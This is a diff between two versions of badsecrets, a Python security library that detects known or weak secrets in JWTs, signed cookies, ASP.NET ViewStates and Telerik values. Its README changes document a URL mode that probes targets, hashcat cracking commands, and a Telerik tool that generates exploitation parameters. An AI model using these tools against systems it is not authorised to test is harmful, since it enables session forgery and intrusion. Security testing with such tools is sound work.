 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/jwt_rsakeys_public.txt` & `badsecrets-0.3.347/badsecrets/resources/jwt_rsakeys_public.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/jwt_secrets.txt` & `badsecrets-0.3.347/badsecrets/resources/jwt_secrets.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/laravel_app_keys.txt` & `badsecrets-0.3.347/badsecrets/resources/laravel_app_keys.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/rails_secret_key_base.txt` & `badsecrets-0.3.347/badsecrets/resources/rails_secret_key_base.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/symfony_appsecret.txt` & `badsecrets-0.3.347/badsecrets/resources/symfony_appsecret.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/telerik_encryption_keys.txt` & `badsecrets-0.3.347/badsecrets/resources/telerik_encryption_keys.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/telerik_hash_keys.txt` & `badsecrets-0.3.347/badsecrets/resources/telerik_hash_keys.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/top_10000_passwords.txt` & `badsecrets-0.3.347/badsecrets/resources/top_10000_passwords.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/pyproject.toml` & `badsecrets-0.3.347/pyproject.toml`

 * *Files 3% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 [tool.poetry]
 name = "badsecrets"
-version = "v0.2.311"
+version = "v0.3.347"
 description = "About"
 authors = ["A library for detecting known or weak secrets on across many platforms"]
 license = "GPL-3.0"
 readme = "README.md"
 
 [tool.poetry.dev-dependencies]
 requests-mock = "^1.10.0"
@@ -18,22 +18,23 @@
 pycryptodome = "^3.15.0"
 viewstate = "^0.5.3"
 pytest = "^7.1.3"
 flask-unsign = "^1.2.0"
 Django = "^4.1.2"
 pyjwt = {extras = ["crypto"], version = "^2.6.0"}
 requests = "^2.28.1"
+colorama = "^0.4.6"
 
 [tool.poetry.scripts]
 badsecrets = 'badsecrets.examples.cli:main'
 
 [tool.black]
 line-length = 119
 
 [build-system]
 requires = ["poetry-core>=1.0.0", "poetry-dynamic-versioning"]
 build-backend = "poetry_dynamic_versioning.backend"
 
 [tool.poetry-dynamic-versioning]
 enable = false
-metadata = false
-format = 'v0.2.{distance}'
+metadata = true
+format = 'v0.3.{distance}'
```

### Comparing `badsecrets-0.2.311/PKG-INFO` & `badsecrets-0.3.347/PKG-INFO`

 * *Files 14% similar despite different names*

```diff
@@ -1,20 +1,21 @@
 Metadata-Version: 2.1
 Name: badsecrets
-Version: 0.2.311
+Version: 0.3.347
 Summary: About
 License: GPL-3.0
 Author: A library for detecting known or weak secrets on across many platforms
 Requires-Python: >=3.9,<4.0
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Programming Language :: Python :: 3
 Classifier: Programming Language :: Python :: 3.9
 Classifier: Programming Language :: Python :: 3.10
 Classifier: Programming Language :: Python :: 3.11
 Requires-Dist: Django (>=4.1.2,<5.0.0)
+Requires-Dist: colorama (>=0.4.6,<0.5.0)
 Requires-Dist: flask-unsign (>=1.2.0,<2.0.0)
 Requires-Dist: pycryptodome (>=3.15.0,<4.0.0)
 Requires-Dist: pyjwt[crypto] (>=2.6.0,<3.0.0)
 Requires-Dist: pytest (>=7.1.3,<8.0.0)
 Requires-Dist: requests (>=2.28.1,<3.0.0)
 Requires-Dist: viewstate (>=0.5.3,<0.6.0)
 Description-Content-Type: text/markdown
@@ -55,22 +56,34 @@
 
 ## Installation
 
 We have a [pypi](https://pypi.org/project/badsecrets/) package, so you can just do `pip install badsecrets` to make use of the library.
 
 ## Simple Usage
 
-The absolute easiest way to use Badsecrets is by simply running `badsecrets` after doing a pip install:
+The best way to use Badsecrets is by simply running `badsecrets` after doing a pip install:
 
 ```
 pip install badsecrets
 badsecrets eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
 ```
 
-This is doing the same thing as the `cli.py` example shown below.
+Under the hood, it's using the  `cli.py` example. The CLI can also be accessed manually without a pip installation:
+
+
+#### Without pip installation:
+```bash
+git clone https://github.com/blacklanternsecurity/badsecrets.git
+cd badsecrets
+python ./badsecrets/examples/cli.py eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
+```
+
+
+
+
 
 ## Examples
 
 To use the examples, after doing the pip install just `git clone` the repo and `cd` into the `badsecrets` directory:
 
 ```
 git clone https://github.com/blacklanternsecurity/badsecrets.git
@@ -80,55 +93,149 @@
 The commands in the example section below assume you are in this directory.
 
 If you are using the Badsecrets [BBOT](https://github.com/blacklanternsecurity/bbot) module, you don't need to do anything else - BBOT will install the package for you.
 
 
 ### cli.py
 
-Bad secrets includes an [example CLI](https://github.com/blacklanternsecurity/badsecrets/blob/dev/examples/cli.py) for convenience when manually checking secrets. It also has a URL mode, which will connect to a target and attempt to carve for cryptographic products and check any it finds against all modules. 
+Bad secrets includes an [example CLI](https://github.com/blacklanternsecurity/badsecrets/blob/dev/examples/cli.py) for convenience when manually checking secrets. As mentioned above, it is also accessible by just executing `badsecrets`, after a successful pip install.
+
+#### Usage
+
+```
+usage: badsecrets [-h] [-nc] [-u URL] [-nh] [-c CUSTOM_SECRETS] [-p PROXY] [-a USER_AGENT] [product ...]
+
+Check cryptographic products against badsecrets library
+
+positional arguments:
+  product               Cryptographic product to check for known secrets
+
+options:
+  -h, --help            show this help message and exit
+  -nc, --no-color       Disable color message in the console
+  -u URL, --url URL     Use URL Mode. Specified the URL of the page to access and attempt to check for secrets
+  -nh, --no-hashcat     Skip the check for compatable hashcat commands when secret isn't found
+  -c CUSTOM_SECRETS, --custom-secrets CUSTOM_SECRETS
+                        include a custom secrets file to load along with the default secrets
+  -p PROXY, --proxy PROXY
+                        In URL mode, Optionally specify an HTTP proxy
+  -a USER_AGENT, --user-agent USER_AGENT
+                        In URL mode, Optionally set a custom user-agent
+
+```
 
 * Basic usage - checking a crytographic product for a known secret (against all modules):
+
 ```bash
-python ./badsecrets/examples/cli.py eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
+badsecrets eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
 ```
+It has a URL mode, which will connect to a target and attempt to carve for cryptographic products and check any it finds against all modules. 
 
-* URL Mode - Connecting to a target and carving for a cryptographic product, and if found checking it for known secrets (against all modules):
+* URL Mode
 
 ```bash
-python ./badsecrets/examples/cli.py --url http://example.com/contains_bad_secret.html
+badsecrets --url http://example.com/contains_bad_secret.html
 ```
 
 You can also set a custom user-agent with `--user-agent "user-agent string"` or a proxy with `--proxy http://127.0.0.1` in this mode.
 
 Example output:
 
 ```bash
-$ python ./badsecrets/examples/cli.py eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
-badsecrets - example command line interface
+$ badsecrets eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
+
+ __ )              |                                |         
+ __ \    _` |   _` |   __|   _ \   __|   __|   _ \  __|   __| 
+ |   |  (   |  (   | \__ \   __/  (     |      __/  |   \__ \ 
+____/  \__,_| \__,_| ____/ \___| \___| _|    \___| \__| ____/ 
+
+v0.3.337
 
-***********************
 Known Secret Found!
 
 Detecting Module: Generic_JWT
 
+Product Type: JSON Web Token (JWT)
+Product: eyJhbGciOiJIUzI1NiJ9.eyJJc3N1ZXIiOiJJc3N1ZXIiLCJVc2VybmFtZSI6IkJhZFNlY3JldHMiLCJleHAiOjE1OTMxMzM0ODMsImlhdCI6MTQ2NjkwMzA4M30.ovqRikAo_0kKJ0GVrAwQlezymxrLGjcEiW_s3UJMMCo
+Secret Type: HMAC/RSA Key
+Location: manual
 Secret: 1234
 Details: {'Issuer': 'Issuer', 'Username': 'BadSecrets', 'exp': 1593133483, 'iat': 1466903083, 'jwt_headers': {'alg': 'HS256'}}
-***********************
+```
+
+* Hashcat
+
+By default, when a secret is NOT found, the provided product will be checked for potential hashcat matches. If there is a match, a nearly complete hashcat command will be produced (potentially) suitable for cracking the product via hashcat. This can let you get those keys that may not be known, but are weak and still crackable. Not all modules are capable of producing hashcat output. This behavior can be disabled with the `--no-hashcat` option.
+
+```
+badsecrets eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.qvkcSLMQPAQdEuRFv0h3aQIRpTfaI57GjXLOWI_6NaE
+```
+
+Example output:
+
+```
+ __ )              |                                |         
+ __ \    _` |   _` |   __|   _ \   __|   __|   _ \  __|   __| 
+ |   |  (   |  (   | \__ \   __/  (     |      __/  |   \__ \ 
+____/  \__,_| \__,_| ____/ \___| \___| _|    \___| \__| ____/ 
+
+v0.3.337
+
+No secrets found :(
+
+Potential matching hashcat commands:
+
+Module: [Flask_SignedCookies] Flask Signed Cookie Command: [hashcat -m 29100 -a 0 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.qvkcSLMQPAQdEuRFv0h3aQIRpTfaI57GjXLOWI_6NaE <dictionary_file>]
+Module: [Generic_JWT] JSON Web Token (JWT) Algorithm: HS256 Command: [hashcat -m 16500 -a 0 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.qvkcSLMQPAQdEuRFv0h3aQIRpTfaI57GjXLOWI_6NaE  <dictionary_file>]
+```
+* Custom Secret Lists
+
+It is possible to specify a file containing additional secrets. These will be added to the default lists when the check is performed. This is accomplished with the `-c` / `--custom-secrets` flag. The provided value must be a valid file. There is a 100k size limit on the provided file.
+
+```
+badsecrets eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.vKxsE0u-TrpoMQ5zmBv1_I-NXSgouq6iZJWMHbHSmgY -c test.txt
+```
+
+Example output:
+
+```
+ __ )              |                                |         
+ __ \    _` |   _` |   __|   _ \   __|   __|   _ \  __|   __| 
+ |   |  (   |  (   | \__ \   __/  (     |      __/  |   \__ \ 
+____/  \__,_| \__,_| ____/ \___| \___| _|    \___| \__| ____/ 
+
+v0.3.337
+
+Including custom secrets list [test.txt]
+
+Known Secret Found!
+
+Detecting Module: Generic_JWT
+
+Product Type: JSON Web Token (JWT)
+Product: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.vKxsE0u-TrpoMQ5zmBv1_I-NXSgouq6iZJWMHbHSmgY
+Secret Type: HMAC/RSA Key
+Location: manual
+Secret: fake123
+Details: {'sub': '1234567890', 'name': 'John Doe', 'iat': 1516239022, 'jwt_headers': {'alg': 'HS256', 'typ': 'JWT'}}
 ```
 
 ### Blacklist3r.py
 
+*Note: This is now obsolete, since `cli.py` is now capable of handling machinekeys/generator values. It will remain included for reference.*
+*Example: `badsecrets KLox5XeGYfb7Lo8zFzr1YepUagXuixcxX55lpFht+rrW6VGheZi831vdusH6DCMfxIhsLG1EPU3OuPvqN2XBc/fj0ew15TQ1zBmmKWJVns4= AAAAAAAA`*
+
 Bad secrets includes a [fully functional CLI example](https://github.com/blacklanternsecurity/badsecrets/blob/dev/badsecrets/examples/blacklist3r.py) which replicates the functionality of [blacklist3r](https://github.com/NotSoSecure/Blacklist3r) in python badsecrets/examples/blacklist3r. 
 
+
 ```bash
 python ./badsecrets/examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
 python ./badsecrets/examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
 ```
 
-
 ### Telerik_knownkey.py
 
 Fully functional CLI example for identifying known Telerik Hash keys and Encryption keys for Post-2017 versions (those patched for CVE-2017-9248), and brute-forcing version / generating exploitation DialogParameters values.
 
 ```bash
 python ./badsecrets/examples/telerik_knownkey.py --url http://vulnerablesite/Telerik.Web.UI.DialogHandler.aspx
 ```
@@ -362,14 +469,14 @@
 
 ### Contributions
 
 Nothing would make us happier than getting a pull request with a new module! But the easiest way to contribute would be helping to populate our word lists! If you find publicly available keys help us make Badsecrets more useful by submitting a pull request to add them.
 
 Requests for modules are always very welcome as well!
 
-### Planned Modules
+### Planned Modules and Future Development
 
 - ~~Laravel~~
 -  ~~Express~~
-
+- Research into network devices with default keys that are detectable via a cryptographic product (For example, Palo Alto Global Protect default masterkeys)
```

